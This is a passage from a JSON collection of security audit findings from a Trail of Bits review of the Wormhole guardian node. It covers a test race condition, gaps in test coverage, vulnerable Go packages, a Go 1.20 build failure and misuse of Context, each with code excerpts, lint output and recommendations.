node/cmd/guardiand/node.go. That is, consider whether the watcher conguration should be handled in node/cmd/guardiand/node.go, as opposed to evm.Watcher.Run. The le node/cmd/guardiand/node.go appears to suer from similar complexity issues. It is possible that a single strategy could address the shortcomings of both pieces of code.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Race condition in TestBlockPoller ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "A race condition causes TestBlockPoller to fail sporadically with the error message in gure 11.1. For a test to be of value, it must be reliable. poller_test.go:300: Error Trace: Error: .../node/pkg/watchers/evm/connectors/poller_test.go:300 Received unexpected error: polling encountered an error: failed to look up latest block: RPC failed Test: TestBlockPoller Figure 11.1: Error produced when TestBlockPoller fails A potential code interleaving causing the above error appears in gure 11.2. The interleaving can be explained as follows:  The main thread sets the baseConnectors error and yields (left column).  The go routine declared at poller_test.go:189 retrieves the error, sets the err variable, loops, retrieves the error a second time, and yields (right column).  The main thread locks the mutex, veries that err is set, clears err, and unlocks the mutex (left).  The go routine sets the err variable a second time (right).  The main thread locks the mutex and panics because err is set (left). baseConnector.setError(fmt.Errorf(\"RPC failed\")) case thisErr := <-headerSubscription.Err(): mutex.Lock() err = thisErr mutex.Unlock() ... case thisErr := <-headerSubscription.Err(): time.Sleep(10 * time.Millisecond) mutex.Lock() require.Equal(t, 1, pollerStatus) assert.Error(t, err) assert.Nil(t, block) baseConnector.setError(nil) err = nil mutex.Unlock() // Post the next block and verify we get it (so we survived the RPC error). baseConnector.setBlockNumber(0x309a10) time.Sleep(10 * time.Millisecond) mutex.Lock() require.Equal(t, 1, pollerStatus) require.NoError(t, err) mutex.Lock() err = thisErr mutex.Unlock() Figure 11.2: Interleaving of node/pkg/watchers/evm/connectors/poller_test.go#L283L300 (left) and node/pkg/watchers/evm/connectors/poller_test.go#L198L201 (right) that causes an error Exploit Scenario Alice, a Wormhole developer, ignores TestBlockPoller failures because she believes the test to be aky. In reality, the test is agging a bug in Alices code, which she commits to the Wormhole repository. Recommendations Short term:  Use dierent synchronization mechanisms in order to eliminate the race condition described above. This will increase TestBlockPollers reliability.  Have the main thread sleep for random rather than xed intervals. This will help to expose bugs like this one. Long term, investigate automated tools for nding concurrency bugs in Go programs. This bug is not agged by Gos race detector. As a result, dierent analyses are needed.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "12. Unconventional test structure ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "Tilt is the primary means of testing Wormhole watchers. Relying on such a coarse testing mechanism makes it dicult to know that all necessary conditions and edge cases are tested. The following are some conditions that should be checked by native Go unit tests:  The right watcher is created for each ChainID (TOB-WORMGUWA-10).  The evm watchers connectors behave correctly (similar to how the evm nalizers correct behavior is now tested).2  The evm watchers logpoller behaves correctly (similar to how the pollers correct behavior is now tested by poller_test.go).  There are no o-by-one errors in any inequality involving a block or round number. Examples of such inequalities include the following:  node/pkg/watchers/algorand/watcher.go#L225  node/pkg/watchers/algorand/watcher.go#L243  node/pkg/watchers/solana/client.go#L363  node/pkg/watchers/solana/client.go#L841 To be clear, we are not suggesting that the Tilt tests be discarded. However, the Tilt tests should not be the sole means of testing the watchers for any given chain. Exploit Scenario Alice, a Wormhole developer, introduces a bug into the codebase. The bug is not exposed by the Tilt tests. Recommendations Short term, develop unit tests for the watcher code. Get as close to 100% code coverage as possible. Develop specic unit tests for conditions that seem especially problematic. These steps will help ensure the correctness of the watcher code. 2 Note that the evm watchers nalizers have nearly 100% code coverage by unit tests. Long term, regularly review test coverage to help identify gaps in the tests as the code evolves.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "13. Vulnerable Go packages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "govulncheck reports that the packages used by Wormhole in table 13.1 have known vulnerabilities, which are described in the following table. Package Vulnerability", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "14. Wormhole node does not build with latest Go version ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "Attempting to build a Wormhole node with the latest Go version (1.20.1) produces the error in gure 14.1. Gos release policy states, Each major Go release is supported until there are two newer major releases. By not building with the latest Go version, Wormholes ability to receive updates will expire. cannot use \"The version of quic-go you're using can't be built on Go 1.20 yet. For more details, please see https://github.com/lucas-clemente/quic-go/wiki/quic-go-and-Go-versions.\" (untyped string constant \"The version of quic-go you're using can't be built on Go 1.20 yet. F...) as int value in variable declaration Figure 14.1: Error produced when one tries to build the Wormhole with the latest Go version (1.20) It is unclear when Go 1.21 will be released. Go 1.20 was released on February 1, 2023 (a few days prior to the start of the audit), and new versions appear to be released about every six months. We found a thread discussing Go 1.21, but it does not mention dates. Exploit Scenario Alice attempts to build a Wormhole node with Go version 1.20. When her attempt fails, Alice switches to Go version 1.19. Go 1.21 is released, and Go 1.19 ceases to receive updates. A vulnerability is found in a Go 1.19 package, and Alice is left vulnerable. Recommendations Short term, adapt the code so that it builds with Go version 1.20. This will allow Wormhole to receive updates for a greater period of time than if it builds only with Go version 1.19. Long term, test with the latest Go version in CI. This will help identify incompatibilities like this one sooner. References  Go Release History (see Release Policy)  Planning Go 1.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Missing or wrong context ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "In several places where a Context is required, the Wormhole node creates a new background Context rather than using the passed-in Context. If the passed-in Context is canceled or times out, a go routine using the background Context will not detect this, and resources will be leaked. The aforementioned problem is agged by the contextcheck lint. For each of the locations named in gure 15.1, a Context is passed in to the enclosing function, but the passed-in Context is not used. Rather, a new background Context is created. algorand/watcher.go:172:51: Non-inherited new context, use function like `context.WithXXX` instead (contextcheck) status, err := algodClient.StatusAfterBlock(0).Do(context.Background()) ^ algorand/watcher.go:196:139: Non-inherited new context, use function like `context.WithXXX` instead (contextcheck) result, err := indexerClient.SearchForTransactions().TXID(base32.StdEncoding.WithPadding(base32.NoP adding).EncodeToString(r.TxHash)).Do(context.Background()) ^ algorand/watcher.go:205:42: Non-inherited new context, use function like `context.WithXXX` instead (contextcheck) block, err := algodClient.Block(r).Do(context.Background()) ^ Figure 15.1: Warnings produced by contextcheck A closely related problem is agged by the noctx lint. In each of the locations named in gure 15.2, http.Get or http.Post is used. These functions do not take a Context argument. As such, if the Context passed in to the enclosing function is canceled, the Get or Post will not similarly be canceled. cosmwasm/watcher.go:198:28: (*net/http.Client).Get must not be called (noctx) resp, err := client.Get(fmt.Sprintf(\"%s/%s\", e.urlLCD, e.latestBlockURL)) ^ cosmwasm/watcher.go:246:28: (*net/http.Client).Get must not be called (noctx) resp, err := client.Get(fmt.Sprintf(\"%s/cosmos/tx/v1beta1/txs/%s\", e.urlLCD, tx)) ^ sui/watcher.go:315:26: net/http.Post must not be called (noctx) resp, err := http.Post(e.suiRPC, \"application/json\", strings.NewReader(buf)) ^ sui/watcher.go:378:26: net/http.Post must not be called (noctx) strings.NewReader(`{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"sui_getCommitteeInfo\", \"params\": []}`)) resp, err := http.Post(e.suiRPC, \"application/json\", ^ wormchain/watcher.go:136:27: (*net/http.Client).Get must not be called (noctx) resp, err := client.Get(fmt.Sprintf(\"%s/blocks/latest\", e.urlLCD)) Figure 15.2: Warnings produced by noctx ^ Exploit Scenario A bug causes Alices Algorand, Cosmwasm, Sui, or Wormchain node to hang. The bug triggers repeatedly. The connections from Alices Wormhole node to the respective blockchain nodes hang, causing unnecessary resource consumption. Recommendations Short term, take the following steps:  For each location named in gure 15.1, use the passed-in Context rather than creating a new background Context.  For each location named in gure 15.2, rewrite the code to use http.Client.Do. Taking these steps will help to prevent unnecessary resource consumption and potential denial of service. Long term, enable the contextcheck and notctx lints in CI. The problems highlighted in this nding were uncovered by those lints. Running them regularly could help to identify similar problems. References  checkcontext  noctx", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}]